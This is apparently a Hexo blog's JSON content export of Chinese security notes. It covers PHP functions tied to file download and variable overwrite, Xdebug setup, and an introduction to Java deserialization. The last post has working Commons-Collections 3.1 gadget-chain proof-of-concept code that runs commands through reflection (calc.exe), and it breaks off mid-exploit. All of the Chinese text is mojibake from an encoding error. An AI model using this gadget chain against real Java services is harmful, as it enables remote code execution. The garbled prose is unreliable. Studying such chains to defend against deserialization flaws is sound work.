{"meta":{"title":"Whippet's Blog","subtitle":"","description":"","author":"whippet","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2020-08-28T08:36:42.000Z","updated":"2020-08-29T14:13:55.325Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2020-08-28T08:36:56.000Z","updated":"2020-08-29T14:14:13.653Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"friendship","date":"2020-08-29T16:34:40.000Z","updated":"2020-08-29T16:34:40.069Z","comments":true,"path":"friendship/index.html","permalink":"http://yoursite.com/friendship/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"test","slug":"test","date":"2020-08-29T16:27:15.000Z","updated":"2020-08-29T16:44:33.716Z","comments":true,"path":"2020/08/30/test/","link":"","permalink":"http://yoursite.com/2020/08/30/test/","excerpt":"","text":"ðŸ‘´ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"å‡½æ•°æ€»ç»“","date":"2020-08-28T08:23:35.130Z","updated":"2020-08-29T16:44:33.716Z","comments":true,"path":"2020/08/28/å‡½æ•°æ€»ç»“/","link":"","permalink":"http://yoursite.com/2020/08/28/%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","excerpt":"","text":"PHP ç›¸å…³å‡½æ•° ä»»æ„æ–‡ä»¶ä¸‹è½½ fread() fread() å‡½æ•°è¯»å–æ–‡ä»¶ï¼ˆå¯å®‰å…¨ç”¨äºŽäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰fread(file,length) å‚æ•° æè¿° file å¿…éœ€ã€‚è§„å®šè¦è¯»å–æ‰“å¼€æ–‡ä»¶ã€‚ length å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚ 123456789101112131415$path = \"../{$file}\";$handle = fopen($path, \"r\");header(\"Pragma: \");header(\"Cache-Control: \");header(\"Content-type: application/octet-stream; charset=utf-8\");header(\"Content-Disposition: attachment; filename=\\\"{$name}\\\"\");if ($handle) { while (!feof($handle)) { $read = fread($handle, 4096); print($read); }}pclose($handle); å˜é‡è¦†ç›– extrat() extract() ä»Žæ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"é€šè¾¾oaæ¼æ´žåˆ†æž","slug":"é€šè¾¾oaæ¼æ´žåˆ†æž/é€šè¾¾oaæ¼æ´žåˆ†æž","date":"2020-08-28T06:57:24.000Z","updated":"2020-08-28T07:06:29.295Z","comments":true,"path":"2020/08/28/é€šè¾¾oaæ¼æ´žåˆ†æž/é€šè¾¾oaæ¼æ´žåˆ†æž/","link":"","permalink":"http://yoursite.com/2020/08/28/%E9%80%9A%E8%BE%BEoa%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEoa%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•","slug":"phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•","date":"2020-08-20T07:19:41.000Z","updated":"2020-08-29T16:44:33.715Z","comments":true,"path":"2020/08/20/phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•/","link":"","permalink":"http://yoursite.com/2020/08/20/phpstorm%E8%BF%9B%E8%A1%8CPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/","excerpt":"é…ç½®çŽ¯å¢ƒ phpstromphpstudy","text":"é…ç½®çŽ¯å¢ƒ phpstromphpstudy phpstrom é…ç½® php çŽ¯å¢ƒ PHPå®‰è£…xdebugæ‰©å±• æ³¨æ„ç‰ˆæœ¬ï¼šæ­¤æ—¶æˆ‘ä»¬ php çš„ç‰ˆæœ¬ä¸º php5.6.9xdebugæ¨¡å—https://xdebug.org/files/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll æŠŠä¸‹è½½æˆåŠŸçš„ php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dllæ”¾åœ¨ E:\\Tools\\phpstudy_pro\\Extensions\\php\\php5.6.9nts\\ext æ–‡ä»¶å¤¹ä¸‹ 12345678910111213[xdebug]zend_extension=\"E:/Tools/phpstudy_pro/Extensions/php/php5.6.9nts/ext/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll\" ;æŒ‡å®šXdebugæ‰©å±•æ–‡ä»¶çš„ç»å¯¹è·¯å¾„xdebug.auto_trace=on ;å¯ç”¨ä»£ç è‡ªåŠ¨è·Ÿè¸ªxdebug.collect_params=on ;å…è®¸æ”¶é›†ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°å˜é‡xdebug.collect_return=on ;å…è®¸æ”¶é›†å‡½æ•°è°ƒç”¨çš„è¿”å›žå€¼xdebug.trace_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;æŒ‡å®šå †æ ˆè·Ÿè¸ªæ–‡ä»¶çš„å­˜æ”¾ç›®å½•xdebug.profiler_enable=on ;æ˜¯å¦å¯ç”¨Xdebugçš„æ€§èƒ½åˆ†æžï¼Œå¹¶åˆ›å»ºæ€§èƒ½ä¿¡æ¯æ–‡ä»¶xdebug.profiler_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;æŒ‡å®šæ€§èƒ½åˆ†æžä¿¡æ¯æ–‡ä»¶çš„è¾“å‡ºç›®å½•xdebug.remote_enable = on ;æ˜¯å¦å¼€å¯è¿œç¨‹è°ƒè¯•xdebug.remote_handler = dbgp ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„å¤„ç†åè®®xdebug.remote_host= localhost ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„ä¸»æœºåxdebug.remote_port = 9000 ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„ç«¯å£å·xdebug.idekey = PHPSTORM ;æŒ‡å®šä¼ é€’ç»™DBGpè°ƒè¯•å™¨å¤„ç†ç¨‹åºçš„IDE Key PHPStrom é…ç½® debug çŽ¯å¢ƒ é…ç½® Debug ç«¯å£ é…ç½®IDEKEY é…ç½®Server é…ç½®PHP Web Application æµè§ˆå™¨çš„xdebugæ’ä»¶ æµ‹è¯•è°ƒè¯• åŠ ä¸Šæ–­ç‚¹ï¼ŒåŒæ—¶æŠŠå°ç”µè¯è®¾ç½®æˆä¸ºç»¿è‰²çš„æµè§ˆå™¨ä¸Šçš„æ’ä»¶æ‰“å¼€ï¼ŒåŒæ—¶è®¿é—®è¦è°ƒè¯•çš„é¡µé¢ è°ƒè¯•å•ä¸ªæ–‡ä»¶ è°ƒè¯•å•ä¸ªæ–‡ä»¶æ—¶ é…ç½®PHP Web Applicationç‚¹å‡»ç»¿è‰²çš„å°è™«å­å°±å¯ä»¥è¿›è¡Œè°ƒè¯•äº† å°±å¯ä»¥è¿›è¡Œæ„‰å¿«çš„è°ƒå¼äº†ï¼ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-08-16T13:31:50.000Z","updated":"2020-08-29T16:44:33.699Z","comments":true,"path":"2020/08/16/hello-world/","link":"","permalink":"http://yoursite.com/2020/08/16/hello-world/","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"åˆè¯†Java ååºåˆ—åŒ–","slug":"Javaååºåˆ—åŒ–","date":"2020-08-16T13:31:50.000Z","updated":"2020-08-29T16:44:33.714Z","comments":true,"path":"2020/08/16/Javaååºåˆ—åŒ–/","link":"","permalink":"http://yoursite.com/2020/08/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"åˆè¯†Java ååºåˆ—åŒ– What ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸Žååºåˆ—åŒ– java åºåˆ—åŒ–å¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–æˆJVMè®¤è¯†çš„å­—èŠ‚åºåˆ—ï¼Œå­—èŠ‚åºåˆ—ä¸­åŒ…å«äº†å¯¹è±¡çš„æ•°æ®ï¼Œä¸»è¦ä»¥å¯¹è±¡å±žæ€§ä¸ºä¸»ã€‚ java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºjavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚åˆ©ç”¨åœ¨Aå¹³å°ä¸Šåºåˆ—åŒ–äº§ç”Ÿçš„å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥åœ¨Bå¹³å°ä¸Šååºåˆ—åŒ–å‡ºåŒæ ·çš„å¯¹è±¡ã€‚","text":"åˆè¯†Java ååºåˆ—åŒ– What ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸Žååºåˆ—åŒ– java åºåˆ—åŒ–å¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–æˆJVMè®¤è¯†çš„å­—èŠ‚åºåˆ—ï¼Œå­—èŠ‚åºåˆ—ä¸­åŒ…å«äº†å¯¹è±¡çš„æ•°æ®ï¼Œä¸»è¦ä»¥å¯¹è±¡å±žæ€§ä¸ºä¸»ã€‚ java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºjavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚åˆ©ç”¨åœ¨Aå¹³å°ä¸Šåºåˆ—åŒ–äº§ç”Ÿçš„å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥åœ¨Bå¹³å°ä¸Šååºåˆ—åŒ–å‡ºåŒæ ·çš„å¯¹è±¡ã€‚ Why ä¸ºä»€ä¹ˆè¦ç”¨åºåˆ—åŒ–ä¸Žååºåˆ—åŒ– å®žçŽ°äº†æ•°æ®çš„æŒä¹…åŒ–ï¼Œé€šè¿‡åºåˆ—åŒ–å¯ä»¥æŠŠæ•°æ®æ°¸ä¹…çš„ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šã€‚ åˆ©ç”¨åºåˆ—åŒ–å®žçŽ°è¿œç¨‹é€šä¿¡ï¼Œå³åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚ How å¦‚ä½•å®žçŽ°åºåˆ—åŒ–ä¸Žååºåˆ—åŒ– JDKç±»åº“ä¸­åºåˆ—åŒ–API ä½¿ç”¨åˆ°JDKä¸­å…³é”®ç±» ObjectOutputStream(å¯¹è±¡è¾“å‡ºæµ) å’ŒObjectInputStream(å¯¹è±¡è¾“å…¥æµ) ObjectOutputStream ç±»ä¸­ï¼šé€šè¿‡ä½¿ç”¨ writeObject(Object object) æ–¹æ³•ï¼Œå°†å¯¹è±¡ä»¥äºŒè¿›åˆ¶æ ¼å¼è¿›è¡Œå†™å…¥ã€‚ ObjectInputStream ç±»ä¸­ï¼šé€šè¿‡ä½¿ç”¨ readObjectï¼ˆï¼‰æ–¹æ³•ï¼Œä»Žè¾“å…¥æµä¸­è¯»å–äºŒè¿›åˆ¶æµï¼Œè½¬æ¢æˆå¯¹è±¡ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ è¢«åºåˆ—åŒ–çš„ç±»å¿…é¡»è¦å®žçŽ° Serializable æŽ¥å£ï¼Œå¦åˆ™å°†æ— æ³•åºåˆ—åŒ–å¯¹è±¡ã€‚ 1234public class User implements Serializable { public String name; public int age;} 12345678910111213141516public class Main { public static void main(String[] args) throws IOException { User user =new User(); user.age = 18; user.name = \"whippet\"; PrintStream out = System.out; ObjectOutputStream objectOutputStream = new ObjectOutputStream(out); objectOutputStream.writeObject(user); objectOutputStream.flush(); objectOutputStream.close(); }} åºåˆ—åŒ–å¯¹è±¡æ—¶ä½¿ç”¨å¯¹è±¡è¾“å‡ºæµâ€ObjectOutputStreamâ€ï¼Œå¾€æŒ‡å®šè¾“å‡ºæµé‡Œå†™å…¥ User å¯¹è±¡ï¼Œä½¿ç”¨æŽ§åˆ¶å°ï¼Œå¯ä»¥ç›´è§‚çš„çœ‹åˆ°å¯¹è±¡åºåˆ—åŒ–åŽçš„æ ·å­ã€‚ ï¿½ï¿½ \u0005sr Simple.Userï¿½ï¿½Gm|\u0007X\u001d\u0002 \u0002I \u0003ageL \u0004namet \u0012Ljava/lang/String;xp \u0012t \u0007whippet ååºåˆ—åŒ–å¯¹è±¡ å°†å¯¹è±¡åºåˆ—åŒ–æˆbyteæ•°ç»„ã€‚å†ç”¨â€ObjectInputStreamâ€ååºåˆ—åŒ–å›žæ¥ã€‚ 12345678910111213141516171819202122232425262728public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { User user =new User(); user.age = 18; user.name = \"whippet\"; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//ç”¨äºŽå­˜æ”¾personå¯¹è±¡åºåˆ—åŒ–byteæ•°ç»„çš„è¾“å‡ºæµ ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(user);//åºåˆ—åŒ–å¯¹è±¡ objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //è¯»å–åºåˆ—åŒ–åŽçš„å¯¹è±¡byteæ•°ç»„ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//å­˜æ”¾byteæ•°ç»„çš„è¾“å…¥æµ ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); //å°†byteæ•°ç»„è¾“å…¥æµååºåˆ—åŒ– System.out.println(o); }} è¾“å‡ºè¿™ä¸ªååºåˆ—åŒ–åŽçš„å¯¹è±¡ï¼Œå’Œä¸€å¼€å§‹ä¸º User å¯¹è±¡è®¾å®šçš„å±žæ€§å€¼å®Œå…¨ç›¸åŒã€‚åŒæ—¶Javaä¸ºæˆ‘ä»¬æä¾›äº†è‡ªå®šä¹‰writeObject()ã€readObject()æ–¹æ³•çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬åœ¨ç›®æ ‡ç±»ä¸­è‡ªå®šä¹‰writeObject()ã€readObject()æ–¹æ³•ä¹‹åŽï¼Œå°†ä¼šé¦–å…ˆè°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„æ–¹æ³•ï¼Œç„¶åŽåœ¨ç»§ç»­æ‰§è¡ŒåŽŸæœ‰çš„æ–¹æ³•æ­¥éª¤. 1234567891011121314151617181920public class User implements Serializable { public String name; public int age; @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } private void readObject(java.io.ObjectInputStream in)throws IOException,ClassNotFoundException { Runtime.getRuntime().exec(\"calc\"); }} User ç±»å†™ä¸€ä¸ª readObject æ–¹æ³•ä¸ŠåŽ»ï¼Œå½“å¯¹è±¡è¢«ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¯¥æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ã€‚ åºåˆ—åŒ–æ—¶ä»…èƒ½åºåˆ—åŒ–å¯¹è±¡çš„å±žæ€§ï¼Œå¹¶ä¸èƒ½æŽ§åˆ¶æ–¹æ³•ä¸­çš„reObjectçš„ä»£ç ï¼Œæ‰€æœ‰æ¼æ´žçš„æž„é€ éœ€è¦å¼•å…¥æ–°çš„jaråŒ… commons-collections-3.1ååºåˆ—åŒ–æ¼æ´ž æ¼æ´žåˆ©ç”¨ åˆ©ç”¨maven å®‰è£…ä¾èµ– 12345678&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Pocexec { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±» Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //è§¦å‘æ¼æ´ž Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\"foobar\"); }} æ¼æ´žåˆ†æž java.lang.Runtime#exec(java.lang.String)åœ¨execå¤„æ·»åŠ æ–­ç‚¹ æŸ¥çœ‹è°ƒç”¨é“¾ æœ€ç»ˆéåŽ†äº†â€outerMapâ€è¿™ä¸ªMapå¯¹è±¡çš„ Entry é›†åˆï¼Œç„¶åŽæ‰§è¡Œäº† Entry å¯¹è±¡çš„çš„ setValue æ–¹æ³•å¯¼è‡´æ‰§è¡Œäº†åå°„é“¾ã€‚æ‰€ä»¥å…ˆæŸ¥çœ‹ outerMap çš„å®žçŽ°ç±» Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); è°ƒç”¨äº†æ–¹æ³•org.apache.commons.collections.map.TransformedMap#decorateè¿™ä¸ªé™æ€æ–¹æ³•åˆåŽ»newäº†ä¸€ä¸ªTransformedMapå¯¹è±¡ã€‚mapä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ™®é€šçš„æ•°æ®ï¼ŒvalueTransformeråˆ™æ˜¯æž„é€ çš„è°ƒç”¨é“¾ã€‚org.apache.commons.collections.map.TransformedMap#TransformedMapå®žä¾‹åŒ–å¯¹è±¡æˆåŠŸåŽä¾æ¬¡è°ƒç”¨äº†å››ä¸ªæ–¹æ³• entrySet() iterator() next() setValue() åœ¨ç±» TransformedMapä¸­æœªæ‰¾åˆ°å®šä¹‰çš„ entrySet()æ–¹æ³•ï¼Œåœ¨ä»–çš„çˆ¶ç±»AbstractInputCheckedMapDecorator ä¸­æ‰¾org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#entrySetnew äº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetEntrySetç±»ä¸­çš„iteratoræ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#iteratoråˆnewäº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIteratorEntrySetIteratorç±»ä¸­çš„nextæ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator#nextåˆnewäº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntryMapEntryç±»ä¸­çš„setValueæ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValueç¬¬ä¸€è¡Œè°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œæ­¤å¤„çš„parentæ¥è‡ªæ‰€ä»¥å®žé™…ä¸Šè°ƒç”¨ä¸º org.apache.commons.collections.map.TransformedMap#checkSetValueè°ƒç”¨äº†valueTransformer çš„transformæ–¹æ³•æ‰€ä»¥é¦–å…ˆè°ƒç”¨äº†org.apache.commons.collections.functors.ChainedTransformer#transformå¾ªçŽ¯è°ƒç”¨æ•°ç»„æ¯ä¸€ä¸ªå¯¹è±¡çš„transformæ–¹æ³•ï¼Œå¹¶ä¼ å…¥objectå¯¹è±¡ï¼Œå†å°†æ‰§è¡Œç»“æžœèµ‹å€¼ç»™objectå¯¹è±¡[0]æ˜¯ConstantTransformerå¯¹è±¡ï¼Œå®ƒä¼šè¿”å›žnewæ—¶å€™çš„å‚æ•°ä¸­çš„Objectå¯¹è±¡ï¼Œè¿™é‡Œä¹Ÿæ˜¯å°±æ˜¯â€java.Runtimeâ€[1]-[3]æ˜¯InvokerTransformerå¯¹è±¡ï¼Œè°ƒç”¨çš„æ˜¯åå°„çš„ä»£ç  iTransformersçš„å€¼æ˜¯åœ¨åˆå§‹åŒ–æž„å»ºChainedTransformeræ—¶ç”Ÿæˆorg.apache.commons.collections.functors.ChainedTransformer#ChainedTransformerConstantTransformerç±»ä¸­å®žçŽ°transformæ–¹æ³•org.apache.commons.collections.functors.ConstantTransformer#transformInvokerTransformerç±»ä¸­å®žçŽ°äº†transformæ–¹æ³•org.apache.commons.collections.functors.InvokerTransformer#transform 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } (â€œgetMethodâ€, new Class[] {String.class, Class[].class }, new Object[] {â€œgetRuntimeâ€, new Class[0] })iMethodName = â€œgetMethodâ€;iParamTypes = new Class[] {String.class, Class[].class } ;iArgs = new Object[] {â€œgetRuntimeâ€, new Class[0] } 123456789101112public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } ......} ç¬¬ä¸€ä¸ªå‚æ•°â€getMethodâ€æ˜¯è¿™ä¸ªå‡½æ•°çš„åå­— ç¬¬äºŒä¸ªå‚æ•°new Class[]{String.class, Class[].class}æ˜¯getMethodçš„2ä¸ªå‚æ•°å‚æ•°ç±»åž‹ï¼Œä¸€ä¸ªæ˜¯Stringï¼Œä¸€ä¸ªæ˜¯class[] ç¬¬ä¸‰ä¸ªå‚æ•°new Object[]{â€œgetRuntimeâ€, new Class[0]}æ˜¯getMethodçš„2ä¸ªå‚æ•°å€¼ï¼Œä¸€ä¸ªæ˜¯getRuntimeï¼Œä¸€ä¸ªæ˜¯ç©ºï¼Œå› ä¸ºæ˜¯æ•°ç»„å½¢å¼æ‰€ä»¥è¦è¿™ä¹ˆå†™ getMethod(&lt;String&gt; â€œgetRuntimeâ€, &lt;Class[]&gt; null)invoke(&lt;Object&gt;null, &lt;Object[]&gt;null)exec(&lt;String&gt;â€œâ€calc.exeâ€â€) å°±æ˜¯é€šè¿‡åå°„åŽ»è°ƒç”¨Runtime.getRuntime().exec(â€œcalc.exeâ€) Javaåå°„æœºåˆ¶ javaä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹æ³•ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime.getRuntime().exec(\"calc\"); }} æ­£å¸¸çš„æ‰§è¡Œæ­¥éª¤ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime runtime = Runtime.getRuntime(); runtime.exec(\"calc\"); } } ç›¸å¯¹åº”çš„åå°„ä»£ç ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); }} Method Class.getMethod(String name, Class&lt;?&gt;â€¦ parameterTypes)çš„ä½œç”¨æ˜¯èŽ·å¾—å¯¹è±¡æ‰€å£°æ˜Žçš„å…¬å¼€æ–¹æ³•ã€‚è¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°nameæ˜¯è¦èŽ·å¾—æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°parameterTypesæ˜¯æŒ‰å£°æ˜Žé¡ºåºæ ‡è¯†è¯¥æ–¹æ³•å½¢å‚ç±»åž‹ã€‚ getMethod(æ–¹æ³•å, æ–¹æ³•ç±»åž‹)Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null);ç­‰ä»·äºŽObject runtime = java.lang.Runtime.getRuntime() person.getClass().getMethod(â€œSpeakâ€, null);èŽ·å¾—personå¯¹è±¡çš„Speakæ–¹æ³•ï¼Œå› ä¸ºSpeakæ–¹æ³•æ²¡æœ‰å½¢å‚ï¼Œæ‰€ä»¥parameterTypesä¸ºnull person.getClass().getMethod(â€œrunâ€, String.class);èŽ·å¾—personå¯¹è±¡çš„runæ–¹æ³•ï¼Œå› ä¸ºrunæ–¹æ³•çš„å½¢å‚æ˜¯Stringç±»åž‹çš„ï¼Œæ‰€ä»¥parameterTypesä¸ºString.class Method Class.invoke(Object obj, Objectâ€¦ args)invoke(æŸä¸ªå¯¹è±¡å®žä¾‹ï¼Œ ä¼ å…¥å‚æ•°) Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\");ç­‰ä»·äºŽ runtime.exec(\"calc\");è°ƒç”¨ç”Ÿæˆçš„runtimeå®žä¾‹çš„execæ–¹æ³•ï¼Œå¹¶å°†â€clacâ€å‚æ•°ä¼ å…¥exec()æ–¹æ³• å®žé™…åˆ©ç”¨ å¯¹è±¡æ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œä½†å¹¶ä¸åœ¨ååºåˆ—åŒ–æ—¶è§¦å‘è°ƒç”¨é“¾ï¼Œè€Œæ˜¯è¦ç»è¿‡è¿­ä»£å™¨è¿­ä»£å¹¶ä¸”ä½¿ç”¨ setValue() æ–¹æ³•æ‰è¡Œï¼Œæ­£å¸¸æƒ…å†µä¸‹åŸºæœ¬ä¸ä¼šæœ‰è¿™ç§åœºæ™¯ã€‚ sun.reflect.annotation.AnnotationInvocationHandlerè¯¥ç±»ä¸­é‡å†™äº†readObjectæ–¹æ³•,åœ¨è¢«è°ƒç”¨æ—¶ä¼šæ‰§è¡ŒsetValueæ“ä½œ, å¦‚æžœèƒ½æŠŠTransformedMapè£…å…¥è¿™ä¸ªAnnotationInvocationHandlerç±»å°±å¯ä»¥å®žçŽ°ä»»æ„ä»£ç æ‰§è¡Œ åˆ©ç”¨ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class AExec implements Serializable { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new 